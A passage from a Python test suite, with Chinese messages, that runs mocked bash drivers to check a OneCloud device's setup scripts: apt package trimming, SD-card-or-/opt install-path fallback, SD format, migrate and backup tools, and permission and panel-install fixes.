            and "ensure_pkg net-tools" not in ssrc:
        log_pass("setup.sh 不再默认补装 dosfstools / wget / net-tools 等非必需包")
    else:
        log_fail("setup.sh 仍在默认补装非必需包")

    # ---- 2) 行为验证: mock apt, 四种开关组合 ----
    lines = src.splitlines()
    i_log = next((i for i, l in enumerate(lines) if l.startswith("log_info()  {")), -1)
    i_net = next((i for i, l in enumerate(lines) if l.startswith("# 网段计算")), -1)
    i_s3 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 3. 换国内源")), -1)
    i_s6 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 6. 配置时区")), -1)
    if min(i_log, i_net, i_s3, i_s6) < 0:
        log_fail("无法定位 helper / 步骤锚点", "代码结构变了, 需同步更新本测试")
        return
    helpers = "\n".join(lines[i_log:i_net - 1])
    flow = "\n".join(lines[i_s3:i_s6])

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t29_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()
    mocks = {
        "apt": '#!/bin/bash\necho "apt $*" >> "$APT_LOG"\nexit 0\n',
        "apt-cache": '#!/bin/bash\necho "apt-cache $*" >> "$APT_LOG"\nexit 0\n',
        "uname": ('#!/bin/bash\n[ "$1" = "-r" ] && { echo "5.10.63-rockchip"; exit 0; }\n'
                  'echo Linux\nexit 0\n'),
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
WORK="@WORK@"
M="@MOCK@"
PATH="$M:/usr/bin:/bin"
export PATH

run_case() {
    local tag="$1" flag="$2" req="$3"
    local root="$WORK/root_$tag"
    mkdir -p "$root/apt/sources.list.d"
    printf 'ID=debian\nVERSION_CODENAME=bookworm\n' > "$root/os-release"
    export ONECLOUD_ETC_ROOT="$root"
    export APT_LOG="$WORK/apt_$tag.log"
    : > "$APT_LOG"
    unset ONECLOUD_EXTRA_PKGS
    apt_switch_defaults
    DO_MIRROR=false
    DO_APT_UPDATE=false
    DO_APT_UPGRADE=false
    DO_APT_PKGS=true
    DO_EXTRA_PKGS="$flag"
    EXTRA_PKGS_REQUEST="$req"
    ( set -e; step_apt_flow ) > "$WORK/out_$tag.txt" 2>&1
    echo "###RC:$tag:$?"
    echo "###APTLOG_BEGIN:$tag"; cat "$APT_LOG"; echo "###APTLOG_END:$tag"
    echo "###OUT_BEGIN:$tag"; cat "$WORK/out_$tag.txt"; echo "###OUT_END:$tag"
}

run_case c1_core   false ""
run_case c2_extra  true  ""
run_case c3_gui    true  "vim xorg firefox-esr"
run_case c4_pick   true  "vim htop"
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(
        helpers + "\n\nstep_apt_flow() {\n" + flow + "\n}\n" + driver
        .replace("@WORK@", _posix(tmpdir))
        .replace("@MOCK@", _posix(mockbin)),
        encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=420)
        out = r.stdout

        def sect(name, tag):
            m = re.search(rf"###{name}_BEGIN:{tag}\n(.*?)\n###{name}_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        def rc(tag):
            m = re.search(rf"###RC:{tag}:(\d+)", out)
            return int(m.group(1)) if m else None

        if "###DONE" not in out:
            log_fail("mock 驱动未跑完", f"stderr={r.stderr[-400:]}")
            return

        if rc("c1_core") == 0:
            log_pass("默认 (只装核心包) 场景正常退出")
        else:
            log_fail(f"默认场景退出码 {rc('c1_core')}")

        c1 = sect("APTLOG", "c1_core")
        if all(f" {p}" in c1 or f"{p}\n" in c1 for p in sorted(CORE)):
            log_pass("默认安装的正是核心包 (curl/git/jq/rsync/parted/wireguard-tools/证书)")
        else:
            miss = [p for p in sorted(CORE) if f" {p}" not in c1]
            log_fail("默认未装全核心包", f"缺失: {miss} | log={c1[:200]}")

        leaked = [p for p in sorted(MOVED) if re.search(rf"\b{re.escape(p)}\b", c1)]
        if not leaked:
            log_pass("默认不再安装任何可选/排障工具 (11 个)")
        else:
            log_fail("默认仍装了可选/排障工具", f"泄漏: {leaked}")

        if "已剔除" not in sect("OUT", "c1_core"):
            log_pass("默认场景无剔除告警 (清单本来就是干净的)")
        else:
            log_fail("默认清单里混进了被黑名单命中的包")

        c2 = sect("APTLOG", "c2_extra")
        preset_hit = [p for p in ("vim", "htop", "net-tools") if re.search(rf"\b{p}\b", c2)]
        if len(preset_hit) == 3:
            log_pass("--extra-pkgs (不带值) 装预设可选清单")
        else:
            log_fail("--extra-pkgs 未装上可选清单", f"命中={preset_hit} log={c2[:200]}")

        c3 = sect("APTLOG", "c3_gui")
        o3 = sect("OUT", "c3_gui")
        if "vim" in c3 and not re.search(r"\b(xorg|firefox-esr)\b", c3):
            log_pass("显式列出的桌面/图形包被剔除 (只装了 vim)")
        else:
            log_fail("桌面/图形包未被剔除", c3[:200])
        if "已剔除桌面/图形组件" in o3:
            log_pass("剔除动作有明确告警 (不是静默丢弃)")
        else:
            log_fail("剔除桌面/图形包时未告警", o3[-300:])

        c4 = sect("APTLOG", "c4_pick")
        if re.search(r"\bvim\b", c4) and re.search(r"\bhtop\b", c4) \
                and not re.search(r"\biotop\b", c4):
            log_pass("--extra-pkgs \"vim htop\" 只装指定的, 不牵连整个预设")
        else:
            log_fail("--extra-pkgs 指定清单未生效", c4[:200])
    except Exception as e:
        log_fail(f"装包精简验证异常: {str(e)}")
        return
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 安装路径自适应 (无卡/未挂载/只读/空间不足 -> /opt 回退) ============
def test_install_path_adaptive():
    """验证 lib-install-path.sh 的决策流:
       SD 卡设备 -> 已挂载 -> 可读写 -> 空间足够 才装到 SD; 否则回退 /opt,
       且写入 SD 失败时自动降级到 /opt 并记录日志。
    """
    lib = SCRIPTS_DIR / "lib-install-path.sh"
    boot = SCRIPTS_DIR / "bootstrap.sh"
    setup = SCRIPTS_DIR / "setup.sh"

    # ---- 静态检查: 库与调用点存在 ----
    if not lib.exists():
        log_fail("缺少 scripts/lib-install-path.sh")
        return
    lsrc = lib.read_text(encoding="utf-8")
    needed = ["sd_probe()", "sd_mount_state()", "sd_rw_ok()", "sd_space_ok()",
              "sd_evaluate()", "resolve_data_root()", "install_path_for()",
              "safe_install_dir()", "safe_install_file()", "safe_install_tree()"]
    miss = [n for n in needed if n not in lsrc]
    if not miss:
        log_pass("lib-install-path.sh 提供完整决策函数集")
    else:
        log_fail("lib-install-path.sh 缺函数", str(miss))
        return

    bsrc = boot.read_text(encoding="utf-8")
    if 'source "${SCRIPT_DIR}/lib-install-path.sh"' in bsrc \
            and "resolve_data_root" in bsrc and "safe_install_tree" in bsrc:
        log_pass("bootstrap.sh 引入并使用了安装路径自适应库")
    else:
        log_fail("bootstrap.sh 未接入安装路径自适应库")

    ssrc = setup.read_text(encoding="utf-8")
    if 'source "${SCRIPT_DIR_SETUP}/lib-install-path.sh"' in ssrc \
            and "resolve_data_root" in ssrc and 'install_path_for srv' in ssrc:
        log_pass("setup.sh 引入并使用了安装路径自适应库")
    else:
        log_fail("setup.sh 未接入安装路径自适应库")

    # 旧写死逻辑必须已移除
    if 'DATA_ROOT="/mnt/sd"' in bsrc:
        log_fail("bootstrap.sh 仍写死 DATA_ROOT=\"/mnt/sd\" (无卡时会指向不存在的目录)")
    else:
        log_pass("bootstrap.sh 已移除写死的 /mnt/sd 回退路径")
    if '[ -d /mnt/sd ] || DATA_DIR="/opt/onecloud/srv"' in ssrc:
        log_fail("setup.sh 仍写死 [ -d /mnt/sd ] 判定")
    else:
        log_pass("setup.sh 已移除写死的 /mnt/sd 目录判定")

    # ---- 行为验证 (mock 环境) ----
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t30_"))
    try:
        sd = tmpdir / "sdmount"
        opt = tmpdir / "optfallback"
        sd.mkdir(); opt.mkdir()
        mockbin = tmpdir / "mockbin"
        mockbin.mkdir()

        # 默认 mock: SD 可用 (mmcblk1 可移动, 挂载在 sd, 空间充足)
        (mockbin / "lsblk").write_text(
            "#!/bin/bash\n"
            'echo "mmcblk0  0 disk"\n'
            '[ "${MOCK_NO_SD:-0}" = "1" ] || echo "mmcblk1  1 disk"\n'
            "exit 0\n", encoding="utf-8", newline="\n")
        (mockbin / "findmnt").write_text(
            "#!/bin/bash\n"
            'if [ "$1" = "-n" ] && [ "$2" = "-o" ] && [ "$3" = "TARGET" ] && [ "$4" = "--source" ]; then\n'
            f'  [ "$5" = "/dev/mmcblk1p1" ] && echo "{_posix(sd)}"\n'
            "fi\n"
            "exit 0\n", encoding="utf-8", newline="\n")
        (mockbin / "mountpoint").write_text(
            "#!/bin/bash\n"
            f'[ "$2" = "{_posix(sd)}" ] && exit 0\n'
            "exit 1\n", encoding="utf-8", newline="\n")
        (mockbin / "df").write_text(
            "#!/bin/bash\n"
            'H="Filesystem\\t1024-blocks\\tUsed\\tAvailable\\tUse%\\tMounted"\n'
            'if [ "$1" = "-Pm" ]; then\n'
            f'  if [ "$2" = "{_posix(sd)}" ]; then echo -e "$H"; echo -e "dev\\t100000\\t10000\\t90000\\t10%\\t$2"; exit 0; fi\n'
            '  echo -e "$H"; echo -e "dev\\t100000\\t100\\t99900\\t1%\\t$2"; exit 0\n'
            "fi\n"
            'if [ "$1" = "-Ph" ]; then echo -e "Filesystem\\tSize\\tUsed\\tAvail\\tUse%\\tMounted";'
            f' echo -e "dev\\t98G\\t10G\\t88G\\t10%\\t$2"; exit 0; fi\n'
            "exit 0\n", encoding="utf-8", newline="\n")
        # 保存默认 df, 供空间不足场景之后恢复
        (mockbin / "df").replace(mockbin / "df.bak")
        for f in mockbin.iterdir():
            try:
                os.chmod(f, 0o755)
            except OSError:
                pass

        driver = tmpdir / "drive.sh"
        driver.write_text(
            "#!/bin/bash\n"
            "set -u\n"
            f'source "{_posix(lib)}"\n'
            f'export INSTALL_FALLBACK_ROOT="{_posix(opt)}"\n'
            "export SD_MIN_SPACE_MB=512\n"
            "export OC_TEST_NO_SYSBLOCK=1\n"
            f'export PATH="{_posix(mockbin)}:$PATH"\n'
            "\n"
            "# A) SD 可用\n"
            "ONECLOUD_SD_TEST_DEV=mmcblk1 resolve_data_root\n"
            'echo "SD_USABLE|${DATA_ROOT}|${INSTALL_VIA_SD}"\n'
            'echo "PATHFOR|$(install_path_for srv)|$(install_path_for docker)|$(install_path_for backups)"\n'
            "\n"
            "# B) 无 SD 卡\n"
            "MOCK_NO_SD=1 resolve_data_root\n"
            'echo "NO_SD|${DATA_ROOT}|${SD_REJECT_REASON}"\n'
            "\n"
            "# C) 设备存在但未挂载 (findmnt 返回空)\n"
            f'cp "{_posix(mockbin)}/findmnt" "{_posix(mockbin)}/findmnt.bak"\n'
            f'printf \'#!/bin/bash\\nexit 0\\n\' > "{_posix(mockbin)}/findmnt"\n'
            "ONECLOUD_SD_TEST_DEV=mmcblk1 resolve_data_root\n"
            'echo "NOT_MOUNTED|${DATA_ROOT}|${SD_REJECT_REASON}"\n'
            f'cp "{_posix(mockbin)}/findmnt.bak" "{_posix(mockbin)}/findmnt"\n'
            "\n"
            "# D) 写入 SD 失败 -> 自动降级 /opt\n"
            "ONECLOUD_SD_TEST_DEV=mmcblk1 resolve_data_root\n"
            'BEFORE="${DATA_ROOT}"\n'
            "ONECLOUD_SD_TEST_FORCE_DEGRADE=1 safe_install_dir \"srv/test\" \"test\"\n"
            'AFTER="${DATA_ROOT}"\n'
            f'MARKER=no; [ -d "{_posix(opt)}/srv/test" ] && MARKER=yes\n'
            'echo "DEGRADE_DIR|before=${BEFORE}|after=${AFTER}|marker=${MARKER}"\n'
            "\n"
            "# E) 空间不足\n"
            f'cp "{_posix(mockbin)}/df.bak" "{_posix(mockbin)}/df"\n'
            f'cat > "{_posix(mockbin)}/df" <<\'DF\'\n'
            "#!/bin/bash\n"
            'H="Filesystem\\t1024-blocks\\tUsed\\tAvailable\\tUse%\\tMounted"\n'
            'if [ "$1" = "-Pm" ]; then\n'
            f'  if [ "$2" = "{_posix(sd)}" ]; then echo -e "$H"; echo -e "dev\\t100000\\t99999\\t1\\t99%\\t$2"; exit 0; fi\n'
            '  echo -e "$H"; echo -e "dev\\t100000\\t100\\t99900\\t1%\\t$2"; exit 0\n'
            "fi\n"
            'if [ "$1" = "-Ph" ]; then echo -e "Filesystem\\tSize\\tUsed\\tAvail\\tUse%\\tMounted";'
            f' echo -e "dev\\t98G\\t97G\\t1G\\t99%\\t$2"; exit 0; fi\n'
            "exit 0\n"
            "DF\n"
            "chmod +x " + f'"{_posix(mockbin)}/df"\n'
            "ONECLOUD_SD_TEST_DEV=mmcblk1 resolve_data_root\n"
            'echo "SPACE_LOW|${DATA_ROOT}|${SD_REJECT_REASON}"\n'
            "\n"
            "# F) SD 可用时正常写入文件\n"
            f'cp "{_posix(mockbin)}/df.bak" "{_posix(mockbin)}/df"\n'
            "chmod +x " + f'"{_posix(mockbin)}/df"\n'
            "ONECLOUD_SD_TEST_DEV=mmcblk1 resolve_data_root\n"
            'safe_install_file "srv/app/conf.yml" "hello: world" "app配置"\n'
            f'WRITTEN=no; [ -f "{_posix(sd)}/srv/app/conf.yml" ] && WRITTEN=yes\n'
            'echo "FILE_SD|written=${WRITTEN}"\n',
            encoding="utf-8", newline="\n")

        env = dict(os.environ)
        env["PATH"] = _posix(mockbin) + ":/usr/bin:/bin"
        env["BASH_ENV"] = ""
        r = subprocess.run(["bash", _posix(driver)], env=env, cwd=str(tmpdir),
                           capture_output=True, text=True, encoding="utf-8",
                           errors="replace", stdin=subprocess.DEVNULL, timeout=120)
        out = r.stdout + r.stderr

        def line(tag):
            m = re.search(rf"^{tag}\|(.+)$", out, re.M)
            return m.group(1) if m else ""

        # A
        a = line("SD_USABLE")
        if a and a.split("|")[0] == _posix(sd) and a.split("|")[1] == "1":
            log_pass("SD 卡可用时安装路径指向 SD 挂载点 (INSTALL_VIA_SD=1)")
        else:
            log_fail("SD 可用时未选择 SD 挂载点", a)
        pf = line("PATHFOR")
        if pf:
            s_, d_, b_ = pf.split("|")
            if s_ == f"{_posix(sd)}/srv" and d_ == f"{_posix(sd)}/docker" \
                    and b_ == f"{_posix(sd)}/backups":
                log_pass("install_path_for 按组件返回 SD 下正确子目录")
            else:
                log_fail("install_path_for 子目录映射错误", pf)
        else:
            log_fail("未输出 PATHFOR")

        # B
        b = line("NO_SD")
        if b and b.split("|")[0] == _posix(opt) and "未检测到 SD 卡设备" in b:
            log_pass("无 SD 卡设备时回退 /opt 且原因明确")
        else:
            log_fail("无 SD 卡未正确回退 /opt", b)

        # C
        c = line("NOT_MOUNTED")
        if c and c.split("|")[0] == _posix(opt) and "SD 卡未挂载" in c:
            log_pass("设备存在但未挂载时回退 /opt (不阻断流程)")
        else:
            log_fail("未挂载未正确回退 /opt", c)

        # D
        d = line("DEGRADE_DIR")
        if d:
            parts = dict(x.split("=") for x in d.split("|")[1:])
            if parts.get("after") == _posix(opt) and parts.get("marker") == "yes":
                log_pass("写入 SD 失败时自动降级到 /opt 且目录在 /opt 落地")
            else:
                log_fail("SD 写入失败未正确降级", d)
        else:
            log_fail("未输出 DEGRADE_DIR")

        # E
        e = line("SPACE_LOW")
        if e and e.split("|")[0] == _posix(opt) and "可用空间不足" in e:
            log_pass("SD 卡空间不足时回退 /opt 且原因含阈值")
        else:
            log_fail("空间不足未正确回退 /opt", e)

        # F
        f = line("FILE_SD")
        if f and f.split("=")[1] == "yes":
            log_pass("SD 可用时文件成功写入 SD 挂载点")
        else:
            log_fail("SD 可用时文件未写入 SD", f)
    except Exception as ex:
        log_fail(f"安装路径自适应验证异常: {str(ex)}")
        return
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 主程序 ============
def test_sd_tools():
    """SD 卡工具箱: 格式化 / 迁移 / 更换(备份到 USB) 脚本的行为与前置校验。"""
    import shutil as _shutil, subprocess as _sp, os as _os, tempfile as _tf, re as _re
    from pathlib import Path as _P

    _GIT = "C:/Users/betyk/.workbuddy/binaries/PortableGit/versions/1.2.0"
    BASH_BIN = f"{_GIT}/bin/bash.exe"

    sd_format = SCRIPTS_DIR / "sd-format.sh"
    sd_migrate = SCRIPTS_DIR / "sd-migrate.sh"
    sd_replace = SCRIPTS_DIR / "sd-replace.sh"
    sd_tools = SCRIPTS_DIR / "sd-tools.sh"

    def check(c, m):
        log_pass(m) if c else log_fail(m)

    # 1. 脚本存在 + 语法
    for f in (sd_format, sd_migrate, sd_replace, sd_tools):
        if not f.exists():
            check(False, f"脚本存在: {f.name}")
            continue
        check(True, f"脚本存在: {f.name}")
        r = _sp.run([BASH_BIN, "-n", str(f)], capture_output=True, text=True,
                    encoding="utf-8", errors="replace")
        check(r.returncode == 0, f"语法正确: {f.name}"
              + ("" if r.returncode == 0 else f" -> {r.stderr[:200]}"))

    # 准备 mockbin
    tmp = _P(_tf.mkdtemp(prefix="sdt_"))
    mockbin = tmp / "mockbin"
    mockbin.mkdir()

    def _pp(x):
        s = str(x)
        m = _re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    def mock(name, body):
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        p.chmod(0o755)

    mock("lsblk", '''#!/bin/bash
if [ "$1" = "-f" ] || [ "$1" = "-fno" ]; then echo "$MOCK_FSTYPE"; exit 0; fi
case "${MOCK_SCENARIO:-full}" in
  nousb) echo "mmcblk0 0 disk"; echo "mmcblk1 1 disk" ;;
  nosd)  echo "mmcblk0 0 disk" ;;
  *)     echo "mmcblk0 0 disk"; echo "mmcblk1 1 disk"; echo "sdb 1 disk usb" ;;
esac
exit 0
''')
    mock("findmnt", '''#!/bin/bash
dev="${!#}"
if [ "$dev" = "/" ] || [ "$dev" = "/dev/mmcblk0p1" ] || [ "$dev" = "/dev/mmcblk0" ]; then echo "${MOCK_ROOT_SRC:-/}"; exit 0; fi
if [ "$dev" = "/dev/mmcblk1p1" ] || [ "$dev" = "/dev/mmcblk1" ]; then echo "${MOCK_SD_MP}"; exit 0; fi
if [ "$dev" = "/dev/sdb1" ] || [ "$dev" = "/dev/sdb" ]; then echo "${MOCK_USB_MP}"; exit 0; fi
exit 0
''')
    mock("mountpoint", '''#!/bin/bash
case "$2" in "${MOCK_SD_MP}"|"${MOCK_USB_MP}"|"/") exit 0 ;; esac
exit 1
''')
    mock("blkid", '''#!/bin/bash
echo "$MOCK_FSTYPE"; exit 0
''')
    mock("df", '''#!/bin/bash
p="$2"
if [ "$p" = "${MOCK_USB_MP}" ]; then free="${MOCK_USB_FREE:-100000}"; else free="90000"; fi
echo -e "Filesystem\\t1024-blocks\\tUsed\\tAvailable\\tUse%\\tMounted"
echo -e "dev\\t100000\\t100\\t${free}\\t1%\\t${p}"
exit 0
''')
    mock("du", '''#!/bin/bash
if [ "$1" = "-sm" ]; then echo "50\\t$2"; exit 0; fi
if [ "$1" = "-h" ]; then echo "10M\\t$2"; exit 0; fi
echo "50\\t$2"; exit 0
''')
    mock("tar", '''#!/bin/bash
f=""
while [ $# -gt 0 ]; do case "$1" in -f) f="$2"; shift 2;; *) shift;; esac; done
echo backup > "$f"; exit 0
''')
    mock("sha256sum", '''#!/bin/bash
echo "abc123  $1"; exit 0
''')
    mock("hostname", '''#!/bin/bash
echo testhost; exit 0
''')
    mock("rsync", '''#!/bin/bash
echo "rsync $*" >> "${FMT_LOG}"; exit 0
''')
    for c in ("parted", "mkfs.ext4", "sfdisk", "partprobe", "mount"):
        mock(c, f'''#!/bin/bash
echo "{c} $*" >> "$FMT_LOG"; exit 0
''')

    sdmount = tmp / "sdmount"; sdmount.mkdir()
    usbmount = tmp / "usbmount"; usbmount.mkdir()
    src = tmp / "src"; src.mkdir(); (src / "app.conf").write_text("x")
    fmtlog = tmp / "fmt.log"

    env = dict(_os.environ)
    env["PATH"] = f"{_pp(mockbin)};{_GIT}/usr/bin;{_GIT}/bin;{env.get('PATH', '')}"
    env["OC_TEST_NO_SYSBLOCK"] = "1"
    env["MOCK_SD_MP"] = _pp(sdmount)
    env["MOCK_USB_MP"] = _pp(usbmount)
    env["ONECLOUD_USB_TEST_PART"] = "/dev/sdb1"
    env["FMT_LOG"] = _pp(fmtlog)

    def run(script, args, extra=None):
        e = dict(env)
        if extra:
            e.update(extra)
        return _sp.run([BASH_BIN, str(script), *args], capture_output=True, text=True,
                      encoding="utf-8", errors="replace",
                      cwd=str(PROJECT_ROOT), env=e, timeout=120)

    # A) sd-format: 已是 ext4 -> 不格式化
    fmtlog.write_text("")
    r = run(sd_format, ["--dev", "mmcblk1", "--yes"],
            {"MOCK_FSTYPE": "ext4", "ONECLOUD_SD_TEST_DEV": "mmcblk1"})
    check("MKFS" not in fmtlog.read_text() and r.returncode == 0,
          "sd-format: 已为 ext4 时不重复格式化")

    # B) sd-format: vfat -> 格式化
    fmtlog.write_text("")
    r = run(sd_format, ["--dev", "mmcblk1", "--yes"],
            {"MOCK_FSTYPE": "vfat", "ONECLOUD_SD_TEST_DEV": "mmcblk1"})
    t = fmtlog.read_text()
    check("MKFS" in t and "parted" in t, "sd-format: 非 ext4 时执行分区+格式化")

    # C) sd-format: 拒绝格式化根磁盘
    fmtlog.write_text("")
    r = run(sd_format, ["--dev", "mmcblk1", "--yes"],
            {"MOCK_FSTYPE": "vfat", "ONECLOUD_SD_TEST_DEV": "mmcblk1",
             "MOCK_ROOT_SRC": "/dev/mmcblk1"})
    check("MKFS" not in fmtlog.read_text(), "sd-format: 拒绝格式化根磁盘")

    # D) sd-format: dry-run 不执行
    fmtlog.write_text("")
    r = run(sd_format, ["--dev", "mmcblk1", "--dry-run", "--yes"],
            {"MOCK_FSTYPE": "vfat", "ONECLOUD_SD_TEST_DEV": "mmcblk1"})
    check("MKFS" not in fmtlog.read_text(), "sd-format: dry-run 不执行格式化")

    # E) sd-migrate: 无 SD -> 拒绝
    r = run(sd_migrate, ["--yes"], {"MOCK_SCENARIO": "nosd"})
    out = r.stdout + r.stderr
    check(r.returncode != 0 and ("未检测" in out or "未就绪" in out),
          "sd-migrate: 无 SD 卡时拒绝执行")

    # F) sd-migrate: SD=vfat 自动格式化 + dry-run 迁移
    fmtlog.write_text("")
    r = run(sd_migrate, ["--dry-run", "--yes", "--source", _pp(src)],
            {"MOCK_SCENARIO": "full", "MOCK_FSTYPE": "vfat",
             "ONECLOUD_SD_TEST_DEV": "mmcblk1"})
    out = r.stdout + r.stderr
    t = fmtlog.read_text()
    check(("MKFS" in t or "DRYRUN" in t), "sd-migrate: 检测到非 ext4 自动触发格式化")
    check(r.returncode == 0 and "[dry-run]" in out, "sd-migrate: 格式化后进入 dry-run 迁移")
    check((src / "app.conf").exists(), "sd-migrate: dry-run 不破坏来源目录")

    # G) sd-migrate: SD=ext4 dry-run 正常
    r = run(sd_migrate, ["--dry-run", "--yes", "--source", _pp(src)],
            {"MOCK_SCENARIO": "full", "MOCK_FSTYPE": "ext4",
             "ONECLOUD_SD_TEST_DEV": "mmcblk1"})
    check(r.returncode == 0 and "[dry-run]" in (r.stdout + r.stderr),
          "sd-migrate: ext4 直接 dry-run 迁移")

    # H) sd-replace: 无 USB -> 拒绝
    r = run(sd_replace, ["--yes"],
            {"MOCK_SCENARIO": "nousb", "MOCK_FSTYPE": "ext4",
             "ONECLOUD_SD_TEST_DEV": "mmcblk1"})
    out = r.stdout + r.stderr
    check(r.returncode != 0 and "USB" in out, "sd-replace: 未插入 USB 时拒绝执行")

    # I) sd-replace: USB 空间不足 -> 拒绝
    r = run(sd_replace, ["--yes"],
            {"MOCK_SCENARIO": "full", "MOCK_FSTYPE": "ext4",
             "ONECLOUD_SD_TEST_DEV": "mmcblk1", "ONECLOUD_USB_TEST_FREE_MB": "10"})
    out = r.stdout + r.stderr
    check(r.returncode != 0 and ("USB" in out or "空间" in out),
          "sd-replace: USB 空间不足时拒绝执行")

    # J) sd-replace: 正常备份到 USB
    r = run(sd_replace, ["--yes"],
            {"MOCK_SCENARIO": "full", "MOCK_FSTYPE": "ext4",
             "ONECLOUD_SD_TEST_DEV": "mmcblk1", "ONECLOUD_USB_TEST_FREE_MB": "100000"})
    out = r.stdout + r.stderr
    check(r.returncode == 0 and "已完成备份" in out and "SHA256" in out,
          "sd-replace: 正常备份并输出校验和")
    arcs = list(usbmount.glob("onecloud-sd-backup-*.tar.gz"))
    check(len(arcs) >= 1 and arcs[0].stat().st_size > 0,
          "sd-replace: USB 上生成非空备份包")

    # K) sd-tools 调度
    r = run(sd_tools, ["--help"])
    out = r.stdout + r.stderr
    check(r.returncode == 0 and "SD 卡工具箱" in out and "迁移" in out
          and "更换" in out and "格式化" in out, "sd-tools: 帮助列出三个功能")
    r = run(sd_tools, ["migrate", "--help"])
    check(r.returncode == 0 and "SD 卡迁移脚本" in (r.stdout + r.stderr),
          "sd-tools: migrate 透传到 sd-migrate --help")
    r = run(sd_tools, ["format", "--help"])
    check(r.returncode == 0 and "SD 卡格式化脚本" in (r.stdout + r.stderr),
          "sd-tools: format 透传到 sd-format --help")

    _shutil.rmtree(str(tmp), ignore_errors=True)


def test_init_deploy_sync():
    """测试 32: 初始化/部署修复 (脚本权限 / 面板迁移 / 节点IP同步 / 远程数据根一致)"""
    print("\n" + "=" * 60)
    print("测试 32: 初始化/部署修复 (权限 / 面板迁移 / IP 同步 / 数据根)")
    print("=" * 60)

    import subprocess as _sp, os as _os, tempfile as _tf, json as _json
    import shutil as _shutil, re as _re
    from pathlib import Path as _P

    _GIT = "C:/Users/betyk/.workbuddy/binaries/PortableGit/versions/1.2.0"
    BASH_BIN = f"{_GIT}/bin/bash.exe"

    def check(c, m):
        log_pass(m) if c else log_fail(m)

    def read(p):
        return _P(p).read_text(encoding="utf-8")

    def _pp(x):
        # Windows 路径 -> msys 路径: 必须先把反斜杠换成 /,
        # 否则传给 bash 的参数 (如 SCRIPT_DIR="C:\...") 会被反斜杠转义吃掉。
        s = str(x).replace("\\", "/")
        m = _re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    def extract_fn(path, name):
        out = []
        on = False
        for ln in read(path).splitlines():
            if ln.startswith(name + "()"):
                on = True
            if on:
                out.append(ln)
                if ln == "}":
                    break
        return "\n".join(out)

    def run_bash(args, extra=None, cwd=None, timeout=300):
        e = dict(_os.environ)
        # 去掉宿主 Bash 工具注入的 BASH_ENV shim: 它会在每次非交互 bash 启动时
        # 重置 PATH, 使子进程里的 awk/mv/sed 等 coreutils 不可用 (环境假失败)。
        # timeout 300s: gen-panel-config.sh 会 source 两个库并遍历全部服务,
        # Git Bash on Windows 进程创建极慢, 120s 会出"脚本没问题但被 kill"。
        e.pop("BASH_ENV", None)
        e["PATH"] = f"{_GIT}/usr/bin;{_GIT}/bin;" + e.get("PATH", "")
        if extra:
            e.update(extra)
        return _sp.run([BASH_BIN, *args], capture_output=True, text=True,
                       encoding="utf-8", errors="replace",
                       cwd=str(cwd or PROJECT_ROOT), env=e, timeout=timeout)

    # ---------- 1) 脚本执行权限批量修复 ----------
    fixp = SCRIPTS_DIR / "fix-perms.sh"
    if not fixp.exists():
        check(False, "fix-perms.sh 存在")
    else:
        check(True, "fix-perms.sh 存在")
        r = run_bash(["-n", _pp(fixp)], timeout=60)
        check(r.returncode == 0, "fix-perms.sh 语法正确")
        fsrc = read(fixp)
        check("chmod +x" in fsrc and "--dry-run" in fsrc and "--list" in fsrc,
              "fix-perms.sh 具备 chmod +x 与 --list/--dry-run")
        check("update-index --chmod=+x" in fsrc,
              "fix-perms.sh 给出 git 索引层次根治提示")
        check("set -euo pipefail" in fsrc and "log_info" in fsrc and "log_error" in fsrc,
              "fix-perms.sh 符合脚本约定 (set -euo pipefail + 日志函数)")

        t = _P(_tf.mkdtemp(prefix="ocfp_"))
        (t / "sub").mkdir()
        (t / "sub" / "x.sh").write_text("#!/bin/bash\necho x\n", encoding="utf-8", newline="\n")
        r = run_bash([_pp(fixp), "--root", _pp(t)], timeout=60)
        _o = r.stdout + r.stderr
        check(r.returncode == 0 and ("已修复" in _o or "无需修改" in _o) and "1 个脚本" in _o,
              "fix-perms.sh: 正确统计目标脚本并处理 (修复 / 确认无需修改)")
        r = run_bash([_pp(fixp), "--list", "--root", _pp(t)], timeout=60)
        check(r.returncode == 0 and "共 1 个脚本" in (r.stdout + r.stderr),
              "fix-perms.sh --list: 输出统计正常")
        r = run_bash([_pp(fixp), "--dry-run", "--root", _pp(t)], timeout=60)
        check(r.returncode == 0 and "dry-run" in (r.stdout + r.stderr),
              "fix-perms.sh --dry-run: 只提示不写入")
        _shutil.rmtree(str(t), ignore_errors=True)

    # ---------- 2) 面板运行文件迁移到稳定目录 ----------
    inst = PANEL_DIR / "install-service.sh"
    isrc = read(inst)
    check("--install-dir" in isrc and "ONECLOUD_PANEL_INSTALL_DIR" in isrc,
          "install-service.sh 支持 --install-dir / ONECLOUD_PANEL_INSTALL_DIR")
    check("panel_install_copy" in isrc and "SRC_DIR=" in isrc,
          "install-service.sh 具备运行文件复制逻辑 (SRC_DIR 保留源码目录)")
    check('_LIB_PANEL_HOST="$(cd "${SRC_DIR}/.."' in isrc,
          "install-service.sh 校验库仍从源码目录定位 (与安装目录解耦)")

    body = extract_fn(inst, "panel_install_copy")
    if not body:
        check(False, "panel_install_copy 可抽取执行")
    else:
        drv = _P(_tf.mkdtemp(prefix="ocpc_"))
        tgt = drv / "inst"
        drv_sh = drv / "drv.sh"
